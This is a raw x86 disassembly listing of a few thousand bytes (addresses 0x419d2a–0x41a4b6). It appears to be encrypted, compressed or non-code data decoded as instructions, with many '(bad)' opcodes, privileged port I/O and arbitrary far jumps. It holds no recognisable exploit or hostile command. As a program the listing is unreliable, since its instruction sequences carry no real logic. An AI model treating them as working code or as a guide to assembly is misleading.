  419d2a:	test   dh,ch
  419d2c:	(bad)  
  419d2d:	mov    ebx,0x132baf3a
  419d32:	push   esp
  419d33:	std    
  419d34:	enter  0x4ee3,0xb
  419d38:	retf   0x2e89
  419d3b:	cmp    BYTE PTR [ecx+0x7f],0x8c
  419d3f:	je     0x419d8a
  419d41:	xchg   edi,eax
  419d42:	dec    edx
  419d43:	dec    ecx
  419d44:	out    0xdc,al
  419d46:	rol    bh,cl
  419d48:	jae    0x419db0
  419d4a:	fwait
  419d4b:	dec    eax
  419d4c:	jle    0x419cf1
  419d4e:	rol    al,0x80
  419d51:	xchg   ecx,eax
  419d52:	push   esi
  419d53:	fcom   DWORD PTR [ebx-0x3d]
  419d56:	aam    0xbc
  419d58:	fwait
  419d59:	cli    
  419d5a:	out    0xa0,al
  419d5c:	fnstsw WORD PTR [edi]
  419d5e:	pop    ebx
  419d5f:	mov    ecx,0xc7fbe838
  419d64:	in     eax,0x6a
  419d66:	stos   BYTE PTR es:[edi],al
  419d67:	xchg   DWORD PTR [esi-0x1b343ba9],edi
  419d6d:	sub    DWORD PTR [eax+0x2e23bcff],ebp
  419d73:	dec    edi
  419d74:	sub    edx,DWORD PTR [edi-0x8]
  419d77:	out    dx,al
  419d78:	pop    es
  419d79:	retf   
  419d7a:	fsub   DWORD PTR [ebp+0x4a9e6ef6]
  419d80:	cmp    ebx,ebp
  419d82:	cmp    eax,0x8cffc798
  419d87:	je     0x419da2
  419d89:	out    0xbd,al
  419d8b:	mov    ecx,0x5bc1496e
  419d90:	mov    eax,0x34ad6a93
  419d95:	ret    
  419d96:	xor    eax,0x7bec1fab
  419d9b:	jg     0x419d36
  419d9d:	lds    eax,FWORD PTR [edx]
  419d9f:	retf   0xab13
  419da2:	dec    esp
  419da3:	mov    bh,0x1b
  419da5:	ss jecxz 0x419d9d
  419da8:	xchg   esi,eax
  419da9:	fcom   DWORD PTR [eax+0x3203eec7]
  419daf:	lods   al,BYTE PTR ds:[esi]
  419db0:	lods   al,BYTE PTR ds:[esi]
  419db1:	jl     0x419df4
  419db3:	imul   ebp,ecx,0xffffff8f
  419db6:	cs dec eax
  419db8:	or     ebx,DWORD PTR [ecx]
  419dba:	je     0x419d51
  419dbc:	pop    edx
  419dbd:	div    DWORD PTR [edi-0x37]
  419dc0:	mov    edi,0xa54d1ae3
  419dc5:	sbb    BYTE PTR [ebp-0x11],ah
  419dc8:	fst    QWORD PTR [ebx]
  419dca:	repnz (bad) [edx+0x28]
  419dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dcf:	rol    BYTE PTR [eax-0xf],1
  419dd2:	data16 (bad) 
  419dd4:	cmp    edi,DWORD PTR [ebp-0x44680ca4]
  419dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ddb:	sub    BYTE PTR [eax],ah
  419ddd:	pushf  
  419dde:	sub    BYTE PTR [esi],cl
  419de0:	int3   
  419de1:	jb     0x419dd6
  419de3:	loope  0x419e1d
  419de5:	mov    esi,0x54f59ec1
  419dea:	or     eax,0x2ba2828c
  419def:	xchg   ebx,eax
  419df0:	dec    edx
  419df1:	in     al,dx
  419df2:	fnstenv [bx+di]
  419df5:	mov    cl,0xe5
  419df7:	ins    DWORD PTR es:[edi],dx
  419df8:	popa   
  419df9:	in     al,0x73
  419dfb:	sub    bh,BYTE PTR [ebx+0x59]
  419dfe:	(bad)
  419e01:	dec    ebx
  419e02:	push   ecx
  419e03:	aas    
  419e04:	cli    
  419e05:	ja     0x419da8
  419e07:	sbb    ah,BYTE PTR [eax+0x1]
  419e0a:	push   edi
  419e0b:	jnp    0x419df3
  419e0d:	gs mov esp,0xa09729d9
  419e13:	mov    ebx,0xb7084f25
  419e18:	jmp    0x47b8:0xc46a7678
  419e1f:	cmp    DWORD PTR [eax],0xffffffcb
  419e22:	stc    
  419e23:	or     eax,0xe0d40e2c
  419e28:	and    cl,ch
  419e2a:	push   0xc8fa8c4
  419e2f:	and    eax,0xd5556159
  419e34:	mov    eax,ds:0x12511662
  419e39:	cmp    ecx,edx
  419e3b:	cwde   
  419e3c:	sbb    ebx,DWORD PTR [ebp+0x56bfbf77]
  419e42:	and    eax,0x26f89c97
  419e47:	jno    0x419e6a
  419e49:	inc    ecx
  419e4a:	xchg   esp,eax
  419e4b:	sahf   
  419e4c:	xchg   esi,eax
  419e4d:	das    
  419e4e:	mov    al,0xe
  419e50:	xor    al,0x94
  419e52:	and    ah,cl
  419e54:	test   DWORD PTR [edx-0x42],edx
  419e57:	fdivr  DWORD PTR [ebp+0x0]
  419e5a:	(bad)  
  419e5b:	dec    esi
  419e5c:	lock mov ah,0xa
  419e5f:	jnp    0x419ede
  419e61:	stc    
  419e62:	push   ecx
  419e63:	inc    ebp
  419e64:	dec    esp
  419e65:	mov    al,0xea
  419e67:	lds    esi,FWORD PTR [ecx]
  419e69:	adc    ch,BYTE PTR [esi+0x414bbf99]
  419e6f:	das    
  419e70:	gs jmp 0x38f45206
  419e76:	stos   BYTE PTR es:[edi],al
  419e77:	dec    esp
  419e78:	add    ecx,ecx
  419e7a:	sub    eax,ebx
  419e7c:	mov    ah,0xbf
  419e7e:	mov    ecx,0x65075a11
  419e83:	inc    ecx
  419e84:	loope  0x419e44
  419e86:	dec    edi
  419e87:	sub    al,0x57
  419e89:	fneni(8087 only) 
  419e8b:	(bad)  
  419e8c:	mov    eax,0x306a3c7a
  419e91:	fidivr DWORD PTR [edi+0x38]
  419e94:	jle    0x419e4a
  419e96:	sbb    DWORD PTR [ecx+esi*4-0x13],edx
  419e9a:	mov    eax,ds:0xf209b633
  419e9f:	pop    ecx
  419ea0:	stos   BYTE PTR es:[edi],al
  419ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ea2:	sub    cl,cl
  419ea4:	mov    esi,0x3dd54773
  419ea9:	neg    esi
  419eab:	scas   al,BYTE PTR es:[edi]
  419eac:	mov    ah,0xb1
  419eae:	push   esi
  419eaf:	faddp  st(4),st
  419eb1:	out    dx,eax
  419eb2:	(bad)  
  419eb3:	or     DWORD PTR [ebx],ebx
  419eb5:	lahf   
  419eb6:	pop    ebx
  419eb7:	daa    
  419eb8:	in     al,0xa5
  419eba:	add    ecx,esp
  419ebc:	add    esi,DWORD PTR [ebx+edi*4-0x72568ce5]
  419ec3:	push   0xf5ad0b9b
  419ec8:	inc    ecx
  419ec9:	mov    ebp,0x8a4e998
  419ece:	retf   
  419ecf:	xor    DWORD PTR [ebx-0x496753c4],ecx
  419ed5:	push   0xffffff9a
  419ed7:	cli    
  419ed8:	icebp  
  419ed9:	inc    ebx
  419eda:	mov    DWORD PTR [esi+0x7d3f0100],edx
  419ee0:	add    BYTE PTR [ecx+0x21b58ce],dh
  419ee6:	loope  0x419e99
  419ee8:	cwde   
  419ee9:	dec    edx
  419eea:	test   DWORD PTR [esi-0x1132e635],esi
  419ef0:	xchg   esi,eax
  419ef1:	sbb    bl,BYTE PTR [ecx]
  419ef3:	push   cs
  419ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ef5:	pop    edx
  419ef6:	scas   eax,DWORD PTR es:[edi]
  419ef7:	mov    eax,0x569fa1f1
  419efc:	in     al,dx
  419efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419efe:	test   edx,ebp
  419f00:	sub    al,0x10
  419f02:	mov    ah,0xbb
  419f04:	sub    dh,BYTE PTR [ecx+eiz*1]
  419f07:	mov    eax,ds:0xfbba409b
  419f0c:	add    al,BYTE PTR ds:0x80fde46e
  419f12:	jbe    0x419efe
  419f14:	les    ebp,FWORD PTR [edi]
  419f16:	(bad)  
  419f17:	rcl    cl,cl
  419f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f1a:	sahf   
  419f1b:	dec    edi
  419f1c:	hlt    
  419f1d:	hlt    
  419f1e:	xor    bh,BYTE PTR [edi-0x22]
  419f21:	sub    DWORD PTR [eax-0x7319937e],edi
  419f27:	stc    
  419f28:	into   
  419f29:	out    dx,eax
  419f2a:	push   esi
  419f2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f2c:	arpl   cx,sp
  419f2e:	dec    ebx
  419f2f:	ss pop ecx
  419f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f32:	nop
  419f33:	or     BYTE PTR [edi],bl
  419f35:	sub    DWORD PTR [ebx+0x0],ecx
  419f38:	mov    edx,0xcfc9004d
  419f3d:	mov    edi,0x6281b03b
  419f42:	mov    cl,0xc
  419f44:	in     eax,0x1
  419f46:	cwde   
  419f47:	pop    es
  419f48:	sbb    DWORD PTR ds:0xf4c17189,0x53
  419f4f:	test   eax,0xfd8d8b3b
  419f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f55:	(bad)  
  419f56:	popf   
  419f57:	sbb    al,0xb4
  419f59:	adc    DWORD PTR [ecx+0x45c4a47f],esp
  419f5f:	push   esp
  419f60:	push   ds
  419f61:	scas   eax,DWORD PTR es:[edi]
  419f62:	add    al,0xc1
  419f64:	push   ebp
  419f65:	(bad)  
  419f66:	imul   edi,DWORD PTR [edx+edx*2+0x1958a87c],0xffffffb9
  419f6e:	xor    DWORD PTR [ebx],ecx
  419f70:	std    
  419f71:	xor    DWORD PTR [esi],esp
  419f73:	int3   
  419f74:	icebp  
  419f75:	int3   
  419f76:	jp     0x419ff6
  419f78:	out    0x3d,eax
  419f7a:	push   0x51
  419f7c:	fisubr DWORD PTR [esi-0x3da2a186]
  419f82:	pushf  
  419f83:	push   0x4b9c15f9
  419f88:	xor    eax,0x90f77570
  419f8d:	mov    edi,0x45309fe4
  419f92:	sbb    al,0xf8
  419f94:	sti    
  419f95:	xchg   esp,eax
  419f96:	cmp    BYTE PTR [ebp-0x3a1d3344],cl
  419f9c:	out    dx,al
  419f9d:	hlt    
  419f9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9f:	pop    ebx
  419fa0:	mov    eax,0xcb5ddaae
  419fa5:	ja     0x419fd8
  419fa7:	sbb    al,BYTE PTR [ecx-0x4d9cb7ae]
  419fad:	rcr    DWORD PTR [edx],1
  419faf:	sbb    BYTE PTR [eax+0x5a],dh
  419fb2:	icebp  
  419fb3:	xor    ecx,DWORD PTR [eax+0x52]
  419fb6:	psubb  mm4,QWORD PTR [esi-0x74fb8ae4]
  419fbd:	pop    ecx
  419fbe:	jb     0x419fc0
  419fc0:	inc    esp
  419fc1:	push   eax
  419fc2:	dec    eax
  419fc3:	cmp    BYTE PTR [edx],dh
  419fc5:	sbb    DWORD PTR [edx+0x8],0xffffff9f
  419fc9:	xchg   BYTE PTR [eax],ah
  419fcb:	aas    
  419fcc:	dec    esp
  419fcd:	sbb    esp,ecx
  419fcf:	xor    al,0x44
  419fd1:	xor    DWORD PTR [eax],eax
  419fd3:	js     0x41a008
  419fd5:	jnp    0x419f8f
  419fd7:	js     0x419fff
  419fd9:	jo     0x41a031
  419fdb:	jbe    0x41a04b
  419fdd:	mov    edi,0xc43c7d9
  419fe2:	dec    dl
  419fe4:	lahf   
  419fe5:	push   es
  419fe6:	scas   al,BYTE PTR es:[edi]
  419fe7:	popf   
  419fe8:	adc    ch,cl
  419fea:	shl    ecx,cl
  419fec:	out    dx,al
  419fed:	jne    0x41a06e
  419fef:	push   es
  419ff0:	inc    ebp
  419ff1:	pop    edi
  419ff2:	adc    esp,edi
  419ff4:	pusha  
  419ff5:	cmp    ah,dh
  419ff7:	aas    
  419ff8:	repz inc ecx
  419ffa:	mov    esp,0x16bdfee6
  419fff:	mov    al,0x7d
  41a001:	sbb    ecx,ecx
  41a003:	push   edi
  41a004:	cmp    ebp,edx
  41a006:	add    dl,BYTE PTR [eax]
  41a008:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41a00a:	push   ds
  41a00b:	inc    ebp
  41a00c:	loopne 0x419fe0
  41a00e:	jecxz  0x41a072
  41a010:	test   al,0x10
  41a012:	adc    ah,ch
  41a014:	adc    ebx,esi
  41a016:	add    al,al
  41a018:	push   eax
  41a019:	mov    dl,0x1a
  41a01b:	das    
  41a01c:	xor    al,ch
  41a01e:	adc    al,0x79
  41a020:	pop    ebp
  41a021:	clc    
  41a022:	shl    BYTE PTR [eax+0x2b],cl
  41a025:	mov    ecx,0x8e40eebd
  41a02a:	sub    al,0xf9
  41a02c:	cli    
  41a02d:	popf   
  41a02e:	outs   dx,DWORD PTR ds:[esi]
  41a02f:	pop    ebp
  41a030:	mov    bl,0x9c
  41a032:	ficomp WORD PTR [ebp+0x45]
  41a035:	cwde   
  41a036:	pop    eax
  41a037:	(bad)  
  41a038:	jmp    0x419fec
  41a03a:	jecxz  0x41a023
  41a03c:	js     0x41a09c
  41a03e:	mov    esp,0xbe280e2
  41a043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a044:	ds test ebp,ebx
  41a047:	mov    dl,0x74
  41a049:	es push esi
  41a04b:	and    BYTE PTR [esi+0x1f],dl
  41a04e:	jmp    0x6aa5:0x8df9600c
  41a055:	xchg   DWORD PTR [edi+esi*8+0x3ed8bb5d],esp
  41a05c:	je     0x41a080
  41a05e:	jo     0x41a00b
  41a060:	mov    ds:0xbdd911bc,al
  41a065:	int3   
  41a066:	xchg   DWORD PTR [edx+0x31],edi
  41a069:	es or  eax,0x8808363c
  41a06f:	sbb    ch,BYTE PTR [edi]
  41a071:	retf   0x60f3
  41a074:	cmc    
  41a075:	mul    BYTE PTR [ecx-0x55c146d0]
  41a07b:	xor    DWORD PTR [ebx+0x49],0xa24b0bcc
  41a082:	ror    DWORD PTR [esi-0x40],cl
  41a085:	das    
  41a086:	sub    al,BYTE PTR [ebp-0x26]
  41a089:	inc    edx
  41a08a:	out    0x5d,al
  41a08c:	popf   
  41a08d:	cmp    al,0x2a
  41a08f:	mov    bh,0x32
  41a091:	retf   0xd54a
  41a094:	xor    eax,0xc541aec9
  41a099:	data16 into 
  41a09b:	call   0xd3e8a09e
  41a0a0:	push   edx
  41a0a1:	mov    ds:0x6d540f65,eax
  41a0a6:	jo     0x41a04d
  41a0a8:	movq   QWORD PTR [ecx],mm7
  41a0ab:	das    
  41a0ac:	push   ds
  41a0ad:	mov    ds:0x20ae420a,al
  41a0b2:	loope  0x41a0b0
  41a0b4:	rol    BYTE PTR [ebx],1
  41a0b6:	fs pop esi
  41a0b8:	mov    ds:0xfd53a770,al
  41a0bd:	ss sti 
  41a0bf:	xchg   esp,eax
  41a0c0:	call   0x19e8:0xf6ac5885
  41a0c7:	retf   
  41a0c8:	cmc    
  41a0c9:	hlt    
  41a0ca:	test   al,0xfc
  41a0cc:	ins    BYTE PTR es:[edi],dx
  41a0cd:	cwde   
  41a0ce:	lea    ecx,[edi+ebp*2]
  41a0d1:	add    ah,BYTE PTR [edx+0x28]
  41a0d4:	arpl   WORD PTR [eax+0x77064388],dx
  41a0da:	popa   
  41a0db:	leave  
  41a0dc:	jmp    0x41a0e8
  41a0de:	lock fnsave [ebx+ecx*2-0x27d9609b]
  41a0e6:	cmp    eax,DWORD PTR [ebp+ebx*8+0x71]
  41a0ea:	mov    ds,WORD PTR [ecx+0x61]
  41a0ed:	repz loopne 0x41a0ac
  41a0f0:	adc    eax,0x8d24f34e
  41a0f5:	mov    ecx,0x62a158b4
  41a0fa:	lods   eax,DWORD PTR ds:[esi]
  41a0fb:	repz test al,0x77
  41a0fe:	fild   WORD PTR [edx+ecx*8-0x2d78c928]
  41a105:	fldenv [eax]
  41a107:	mov    esi,0x84a8844f
  41a10c:	pop    ecx
  41a10d:	in     al,0x40
  41a10f:	xor    BYTE PTR [edi+0x55],dl
  41a112:	adc    al,0xd2
  41a114:	imul   ebx,DWORD PTR [ebx-0x50],0xffffff94
  41a118:	lds    ebx,FWORD PTR [esi-0x52007b16]
  41a11e:	popf   
  41a11f:	ss push 0xa
  41a122:	in     al,dx
  41a123:	js     0x41a138
  41a125:	ja     0x41a142
  41a127:	rcr    DWORD PTR ds:0xa7aa970,0xa8
  41a12e:	mov    DWORD PTR [eax-0x24896228],ebp
  41a134:	pop    ss
  41a135:	jnp    0x41a141
  41a137:	sbb    BYTE PTR ds:[esi-0xb4e4b32],cl
  41a13e:	shl    esi,0x99
  41a141:	std    
  41a142:	out    0x3f,eax
  41a144:	fsubrp st(1),st
  41a146:	cmp    esi,esi
  41a148:	cli    
  41a149:	mov    bh,0x57
  41a14b:	jl     0x41a140
  41a14d:	leave  
  41a14e:	sbb    al,BYTE PTR [ebx-0x33]
  41a151:	shr    DWORD PTR [edi-0x4d494a2c],cl
  41a157:	sub    DWORD PTR [edi+edi*1-0x1e8d0631],esp
  41a15e:	lds    ecx,FWORD PTR [edi]
  41a160:	jmp    FWORD PTR [eax+0x64d72578]
  41a166:	shl    cl,0x72
  41a169:	mov    eax,ds:0xc2c1f9f7
  41a16e:	pop    esi
  41a16f:	pop    ecx
  41a170:	push   ss
  41a171:	pop    es
  41a172:	add    eax,0xb581350
  41a177:	push   0x2ae68fc
  41a17c:	imul   ecx,DWORD PTR [ebx-0x7d],0x75
  41a180:	push   ebp
  41a181:	in     al,dx
  41a182:	iret   
  41a183:	rcl    DWORD PTR [edi+0x29f7ec6d],0x38
  41a18a:	cmp    cl,ah
  41a18c:	test   al,0xf6
  41a18e:	and    ebx,DWORD PTR [edi]
  41a190:	test   al,bh
  41a192:	mov    dh,0xfa
  41a194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a195:	in     al,0x9b
  41a197:	(bad)  
  41a198:	jle    0x41a12c
  41a19a:	bound  esi,QWORD PTR [eax+0x30]
  41a19d:	out    0x38,eax
  41a19f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1a0:	pop    edi
  41a1a1:	push   edx
  41a1a2:	int3   
  41a1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1a4:	jge    0x41a16b
  41a1a6:	mov    DWORD PTR [eax-0x65c44eed],esi
  41a1ac:	or     DWORD PTR [edi+0x58dbcd3a],edi
  41a1b2:	aas    
  41a1b3:	call   FWORD PTR [esi-0x3fd6b9ba]
  41a1b9:	mov    ds:0x589fff8e,al
  41a1be:	fsqrt  
  41a1c0:	scas   al,BYTE PTR es:[edi]
  41a1c1:	fmul   st,st(3)
  41a1c3:	sub    DWORD PTR [esi-0x56],edi
  41a1c6:	inc    esi
  41a1c7:	clc    
  41a1c8:	mov    ebx,0x72572bfa
  41a1cd:	jle    0x41a1e7
  41a1cf:	sbb    BYTE PTR [edx],ch
  41a1d1:	push   ds
  41a1d2:	add    DWORD PTR [ebp-0x220dc8ab],0xf5e3b93d
  41a1dc:	inc    eax
  41a1dd:	popa   
  41a1de:	retfw  0xdc13
  41a1e2:	cmp    BYTE PTR [ebx+0x37c3673c],0x30
  41a1e9:	cmp    ebp,DWORD PTR [ebx]
  41a1eb:	push   edx
  41a1ec:	jge    0x41a22a
  41a1ee:	int3   
  41a1ef:	mov    edx,0xf59c6aa
  41a1f4:	retf   
  41a1f5:	xchg   ebx,eax
  41a1f6:	in     al,0xa6
  41a1f8:	inc    ecx
  41a1f9:	shl    esp,cl
  41a1fb:	(bad)  
  41a1fc:	sbb    ch,cl
  41a1fe:	out    0x83,al
  41a200:	dec    ecx
  41a201:	fst    QWORD PTR [esi]
  41a203:	sbb    BYTE PTR [edx-0x11b4328],bl
  41a209:	iret   
  41a20a:	xchg   BYTE PTR [ebx-0x3e4e7356],dh
  41a210:	inc    esi
  41a211:	mov    ecx,0x29ffcab2
  41a216:	rcl    BYTE PTR [esi+0x5528b048],1
  41a21c:	jecxz  0x41a1ef
  41a21e:	ss inc edx
  41a220:	jge    0x41a291
  41a222:	pop    DWORD PTR [ebx+esi*4+0x26a19147]
  41a229:	repz adc BYTE PTR [eax+0x78],cl
  41a22d:	popf   
  41a22e:	jmp    0xe480:0x43814b3
  41a235:	lahf   
  41a236:	push   0xffffffd6
  41a238:	ret    
  41a239:	(bad)  
  41a23a:	pop    ds
  41a23b:	lea    esp,[edx-0x16]
  41a23e:	fwait
  41a23f:	rcr    bl,0xd6
  41a242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a243:	inc    esi
  41a244:	leave  
  41a245:	jns    0x41a280
  41a247:	xor    DWORD PTR [esi+0x2e0c7b7d],edi
  41a24d:	fwait
  41a24e:	jg     0x41a2ca
  41a250:	xchg   sp,ax
  41a252:	cmc    
  41a253:	lea    esp,[ebp+0x14]
  41a256:	imul   ebx,DWORD PTR [esp+ebp*2+0x19],0xb92bca70
  41a25e:	mov    bl,0x7d
  41a260:	les    ebp,FWORD PTR [esi]
  41a262:	outs   dx,BYTE PTR ds:[esi]
  41a263:	aad    0x0
  41a265:	mov    bh,0x3f
  41a267:	in     eax,dx
  41a268:	push   cs
  41a269:	mov    cl,0xf0
  41a26b:	jmp    0xd622:0x70717337
  41a272:	(bad)  
  41a273:	ficomp WORD PTR [eax+ebx*2]
  41a276:	js     0x41a24d
  41a278:	mov    gs,WORD PTR [edx+edi*1+0x51]
  41a27c:	mov    esp,0x4c64109c
  41a281:	gs jns 0x41a292
  41a284:	jecxz  0x41a26f
  41a286:	push   ebp
  41a287:	mov    edi,0xd7fa8cf7
  41a28c:	mov    BYTE PTR [esi-0x5ea7693f],bl
  41a292:	repnz mov ebp,0x7a79b5b8
  41a298:	(bad)  [eax]
  41a29a:	mov    ch,0xf0
  41a29c:	pop    ebx
  41a29d:	jo     0x41a25f
  41a29f:	add    DWORD PTR gs:[ecx+0x32e7207c],ebx
  41a2a6:	mov    BYTE PTR [eiz*4+0x698fb305],dh
  41a2ad:	loopne 0x41a278
  41a2af:	lds    esi,FWORD PTR [ecx+0x22]
  41a2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2b3:	cmp    BYTE PTR [edx+0x681dcd85],bl
  41a2b9:	fiadd  WORD PTR gs:[ebx+0x2493892e]
  41a2c0:	jns    0x41a2df
  41a2c2:	xchg   ebx,eax
  41a2c3:	loope  0x41a253
  41a2c5:	push   ss
  41a2c6:	adc    edi,DWORD PTR [ebp-0x682bc8ec]
  41a2cc:	and    bl,BYTE PTR [ecx-0x7a0bd4b5]
  41a2d2:	sub    eax,0xf6c0275e
  41a2d7:	addr16 push es
  41a2d9:	mov    dl,0x30
  41a2db:	cmp    al,0x2f
  41a2dd:	push   0x11ffb12c
  41a2e2:	outs   dx,DWORD PTR ds:[esi]
  41a2e3:	icebp  
  41a2e4:	mov    BYTE PTR [eax],ch
  41a2e6:	or     dl,BYTE PTR [ebp-0x2d]
  41a2e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ea:	mov    ebp,0x79b238d7
  41a2ef:	sub    eax,0x229c4a3a
  41a2f4:	jg     0x41a2cd
  41a2f6:	fwait
  41a2f7:	retf   
  41a2f8:	adc    edx,DWORD PTR [ecx+0x55]
  41a2fb:	pop    ss
  41a2fc:	pop    eax
  41a2fd:	popa   
  41a2fe:	or     al,0xb4
  41a300:	push   ebx
  41a301:	xchg   esp,eax
  41a302:	mov    ch,0x1e
  41a304:	lods   eax,DWORD PTR ds:[esi]
  41a305:	or     esp,DWORD PTR [eax+0x37]
  41a308:	xor    DWORD PTR [edx+0xc],ecx
  41a30b:	xor    al,0x9f
  41a30d:	adc    eax,0x43730845
  41a312:	arpl   ax,sp
  41a314:	cmp    BYTE PTR [esi+0x657c469a],bh
  41a31a:	cmp    al,0xb
  41a31c:	leave  
  41a31d:	xchg   ebp,eax
  41a31e:	js     0x41a32d
  41a320:	cs xchg ecx,eax
  41a322:	xor    ebx,DWORD PTR [ecx-0x3d01eedb]
  41a328:	shr    BYTE PTR [eax],1
  41a32a:	in     al,dx
  41a32b:	aad    0x97
  41a32d:	clc    
  41a32e:	inc    edi
  41a32f:	mov    esp,0x13ead097
  41a334:	jns    0x41a2b7
  41a336:	add    al,ah
  41a338:	mov    dh,0xbf
  41a33a:	mov    WORD PTR [edi-0xd],fs
  41a33d:	pop    esi
  41a33e:	sbb    ebx,DWORD PTR [ecx-0x63]
  41a341:	cwde   
  41a342:	icebp  
  41a343:	sbb    edx,DWORD PTR [edx]
  41a345:	je     0x41a347
  41a347:	cmc    
  41a348:	add    ecx,DWORD PTR [ebp-0xd933f6c]
  41a34e:	jb     0x41a2d4
  41a350:	adc    al,0xd8
  41a352:	cmp    al,bl
  41a354:	test   eax,0x38cfb0c0
  41a359:	sbb    al,0xe9
  41a35b:	mov    esp,0x6425e5b9
  41a360:	xchg   ebp,ebp
  41a362:	out    dx,eax
  41a363:	das    
  41a364:	push   eax
  41a365:	push   esi
  41a366:	and    esi,DWORD PTR [edx]
  41a368:	ror    BYTE PTR [ecx-0x7f],1
  41a36b:	repnz mov ds:0x4efc1138,al
  41a371:	xor    bl,al
  41a373:	(bad)  
  41a375:	push   ss
  41a376:	sahf   
  41a377:	lea    edx,[ebx+esi*2-0x2f]
  41a37b:	mov    al,ds:0x87cbc035
  41a380:	add    eax,0x9d5e87aa
  41a385:	imul   eax,DWORD PTR [ebp+edx*2+0x2f],0xffffffa1
  41a38a:	dec    ebx
  41a38b:	sbb    al,0x6c
  41a38d:	push   DWORD PTR [ebx+0x65]
  41a390:	cmp    BYTE PTR [esi+0x6b1150cc],0x7a
  41a397:	sbb    ebp,DWORD PTR [edi-0x4f]
  41a39a:	retf   0x6b2d
  41a39d:	sar    DWORD PTR [esi+0x329c7d13],cl
  41a3a3:	imul   ebx,edi,0x65
  41a3a6:	loopne 0x41a3fd
  41a3a8:	mov    edi,0xc738bd22
  41a3ad:	in     eax,0x59
  41a3af:	pop    edx
  41a3b0:	xor    BYTE PTR [edi-0x6b],bl
  41a3b3:	dec    ecx
  41a3b4:	mov    ah,0xc5
  41a3b6:	jno    0x41a37b
  41a3b8:	xor    BYTE PTR fs:[esp+esi*2],dl
  41a3bc:	jbe    0x41a374
  41a3be:	mov    bh,0xa
  41a3c0:	mov    dh,0x87
  41a3c2:	out    0x44,eax
  41a3c4:	rcr    dh,0x90
  41a3c7:	pusha  
  41a3c8:	mov    al,0xc2
  41a3ca:	fsubp  st(3),st
  41a3cc:	ds push ecx
  41a3ce:	add    BYTE PTR [ebp+0x26],ch
  41a3d1:	push   ebx
  41a3d2:	xchg   BYTE PTR [ecx+0x41e610fe],ch
  41a3d8:	leave  
  41a3d9:	(bad)  
  41a3da:	push   ebp
  41a3db:	(bad)  
  41a3dd:	mul    bh
  41a3df:	call   0xb94d:0xdd36069
  41a3e6:	sti    
  41a3e7:	imul   edx,ecx,0xeff41dbd
  41a3ed:	dec    esp
  41a3ee:	jno    0x41a429
  41a3f0:	(bad)  [esi-0x45]
  41a3f3:	dec    ebp
  41a3f4:	jle    0x41a40a
  41a3f6:	inc    esp
  41a3f8:	sub    al,0x97
  41a3fa:	test   eax,0x8a68517
  41a3ff:	inc    edx
  41a400:	dec    esi
  41a401:	shr    BYTE PTR [edi+0x71],0x4f
  41a405:	dec    eax
  41a406:	dec    edi
  41a407:	jne    0x41a38e
  41a409:	test   eax,0x78be3616
  41a40e:	nop
  41a40f:	stos   DWORD PTR es:[edi],eax
  41a410:	sbb    esi,DWORD PTR [edx+eiz*1-0x7c8aaca5]
  41a417:	ss dec edx
  41a419:	or     edx,DWORD PTR [ecx+0x43f96aa2]
  41a41f:	push   ebp
  41a420:	mov    dl,al
  41a422:	shr    BYTE PTR [esi],0xaf
  41a425:	mov    al,ds:0x8d7bc06a
  41a42a:	pop    ecx
  41a42b:	lods   al,BYTE PTR ds:[esi]
  41a42c:	cmc    
  41a42d:	and    esi,ebp
  41a42f:	in     al,0xd7
  41a431:	(bad)  
  41a432:	mov    eax,ds:0xe968378d
  41a437:	jge    0x41a49e
  41a439:	jae    0x41a3d4
  41a43b:	adc    BYTE PTR [ebx+0x76b6f09d],ah
  41a441:	loop   0x41a48c
  41a443:	out    dx,al
  41a444:	mov    DWORD PTR [ebp+ebp*2+0x41575e5b],eax
  41a44b:	mov    ebp,DWORD PTR [esi-0x1]
  41a44e:	rcl    DWORD PTR [esi+eax*4-0x29cb4daf],0x6a
  41a456:	jle    0x41a4af
  41a458:	mov    eax,0x7733ba98
  41a45d:	ins    DWORD PTR es:[edi],dx
  41a45e:	popf   
  41a45f:	stos   DWORD PTR es:[edi],eax
  41a460:	es in  al,0x4c
  41a463:	xor    ah,BYTE PTR [eax]
  41a465:	in     eax,dx
  41a466:	xor    BYTE PTR [edi+edx*2-0x79],0xec
  41a46b:	cmp    BYTE PTR [edx+0x35],al
  41a46e:	pop    edx
  41a46f:	pop    eax
  41a471:	mov    al,0x4a
  41a473:	repz mov edx,0x137ce457
  41a479:	aaa    
  41a47a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a47b:	cmp    BYTE PTR ds:0xae98803,cl
  41a481:	bound  esi,QWORD PTR [edx-0x11]
  41a484:	dec    edi
  41a485:	xchg   ebp,eax
  41a486:	xlat   BYTE PTR ds:[ebx]
  41a487:	push   es
  41a488:	adc    bh,BYTE PTR [edi]
  41a48a:	sub    ah,BYTE PTR [eax+ebx*2-0x6b]
  41a48e:	or     DWORD PTR [esp+eiz*2-0x53df5381],ebx
  41a495:	adc    DWORD PTR [esp+ecx*4-0x45],ecx
  41a499:	repnz and eax,0x7cd96e29
  41a49f:	xchg   ecx,eax
  41a4a0:	xor    al,0x15
  41a4a2:	loop   0x41a46b
  41a4a4:	out    dx,eax
  41a4a5:	cmp    eax,0x509e5d5d
  41a4aa:	mov    ss,WORD PTR [ebp-0x26209279]
  41a4b0:	push   eax
  41a4b1:	push   ds
  41a4b2:	call   FWORD PTR [ebx-0x2a]
  41a4b5:	inc    esi
  41a4b6:	gs push ecx
